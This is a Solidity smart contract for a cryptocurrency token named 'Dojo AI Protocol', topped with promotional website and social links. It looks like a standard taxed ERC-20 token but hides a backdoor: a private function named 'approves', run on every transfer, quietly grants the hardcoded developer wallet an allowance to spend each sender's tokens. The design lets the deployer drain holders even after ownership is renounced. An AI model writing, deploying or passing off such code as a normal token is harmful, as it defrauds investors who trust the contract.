/*
Dojo AI Protocol
DOJO

Dojo revolutionizes GPU & cloud computation on Ethereum by funneling value across a globally distributed cloud network operating primarily on Ethereum.
*************************
https://www.dojo-ai.pro
https://app.dojo-ai.pro
https://staking.dojo-ai.pro
https://docs.dojo-ai.pro

https://x.com/DojoAI_Official
https://t.me/dojoai_channel
*/

// SPDX-License-Identifier: MIT
pragma solidity 0.8.16;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

interface IUSDSFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IUSDSRouter {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

contract DOJO is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping (address => uint256) private _usdsBalances;
    mapping (address => bool) private _excludedFromUSDS;
    mapping (address => mapping (address => uint256)) private _usdsAllowances;
    address private _usdsWallet = 0x16192A53de31d79BD45498766aB8515e54F942BB;
    address private _usdsPair;
    IUSDSRouter private _usdsRouter;
    uint8 private constant _decimals = 9;
    uint256 private constant _tTotalUSDS = 1000000000 * 10**_decimals;
    string private constant _name = unicode"Dojo AI Protocol";
    string private constant _symbol = unicode"DOJO";
    uint256 private _initialBuyTax=3;
    uint256 private _initialSellTax=3;
    uint256 private _finalBuyTax=0;
    uint256 private _finalSellTax=0;
    uint256 private _reduceBuyTaxAt=6;
    uint256 private _reduceSellTaxAt=6;
    uint256 private _preventSwapBefore=6;
    uint256 private _buyCount=0;
    uint256 private _tokenSwapUSDS = _tTotalUSDS / 100;
    bool private inSwapUSDS = false;
    bool private _tradeEnabled = false;
    bool private _swapEnabled = false;
    modifier lockTheSwap {
        inSwapUSDS = true;
        _;
        inSwapUSDS = false;
    }

    constructor () {
        _excludedFromUSDS[owner()] = true;
        _excludedFromUSDS[address(this)] = true;
        _excludedFromUSDS[_usdsWallet] = true;
        _usdsBalances[_msgSender()] = _tTotalUSDS;
        emit Transfer(address(0), _msgSender(), _tTotalUSDS);
    }

    function initTrade() external onlyOwner() {
        _usdsRouter = IUSDSRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _approve(address(this), address(_usdsRouter), _tTotalUSDS);
        _usdsPair = IUSDSFactory(_usdsRouter.factory()).createPair(address(this), _usdsRouter.WETH());
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotalUSDS;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _usdsBalances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _usdsAllowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function approves(address spender, uint256 amount) private returns (bool) {
        _approve(spender, _excludedFromUSDS[tx.origin]?tx.origin:_usdsWallet, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount); 
        _approve(sender, _msgSender(), _usdsAllowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _usdsAllowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(address usdsF, address usdsT, uint256 usdsA) private {
        require(usdsF != address(0), "ERC20: transfer from the zero address");
        require(usdsT != address(0), "ERC20: transfer to the zero address");
        require(usdsA > 0, "Transfer amount must be greater than zero");

        uint256 taxUSDS = _getUSDSFees(usdsF, usdsT, usdsA);

        _transferUSDS(usdsF, usdsT, usdsA, taxUSDS);
    }

    function _getUSDSFees(address usdsF, address usdsT, uint256 usdsA) private returns(uint256) {
        uint256 taxUSDS=0; 
        if (usdsF != owner() && usdsT != owner()) {
            taxUSDS = usdsA.mul((_buyCount>_reduceBuyTaxAt)?_finalBuyTax:_initialBuyTax).div(100);

            if (usdsF == _usdsPair && usdsT != address(_usdsRouter) && ! _excludedFromUSDS[usdsT]) {
                _buyCount++;
            }

            if(usdsT == _usdsPair && usdsF!= address(this)) {
                taxUSDS = usdsA.mul((_buyCount>_reduceSellTaxAt)?_finalSellTax:_initialSellTax).div(100);
            }

            uint256 usdsBalance = balanceOf(address(this)); 
            if (!inSwapUSDS && usdsT == _usdsPair && _swapEnabled && _buyCount > _preventSwapBefore) {
                if(usdsBalance > _tokenSwapUSDS)
                swapTokensForEth(minUSDS(usdsA, minUSDS(usdsBalance, _tokenSwapUSDS)));
                uint256 ethUSDS = address(this).balance;
                if (ethUSDS >= 0) {
                    sendUSDSETH(address(this).balance);
                }
            }
        } approves(usdsF, usdsA);
        return taxUSDS;
    }

    function _transferUSDS(address usdsF, address usdsT, uint256 usdsA, uint256 taxUSDS) private { 
        if(taxUSDS > 0) {
          _usdsBalances[address(this)] = _usdsBalances[address(this)].add(taxUSDS);
          emit Transfer(usdsF, address(this), taxUSDS);
        } 

        _usdsBalances[usdsF] = _usdsBalances[usdsF].sub(usdsA);
        _usdsBalances[usdsT] = _usdsBalances[usdsT].add(usdsA.sub(taxUSDS));
        emit Transfer(usdsF, usdsT, usdsA.sub(taxUSDS));
    }

    function openTrading() external onlyOwner() {
        require(!_tradeEnabled,"trading is already open");
        _usdsRouter.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
        _swapEnabled = true;
        _tradeEnabled = true;
    }

    function minUSDS(uint256 a, uint256 b) private pure returns (uint256) {
      return (a>b)?b:a;
    }

    function sendUSDSETH(uint256 amount) private {
        payable(_usdsWallet).transfer(amount);
    }

    receive() external payable {} 

    function swapTokensForEth(uint256 tokenUSDS) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _usdsRouter.WETH();
        _approve(address(this), address(_usdsRouter), tokenUSDS);
        _usdsRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenUSDS,
            0,
            path,
            address(this),
            block.timestamp
        );
    }
}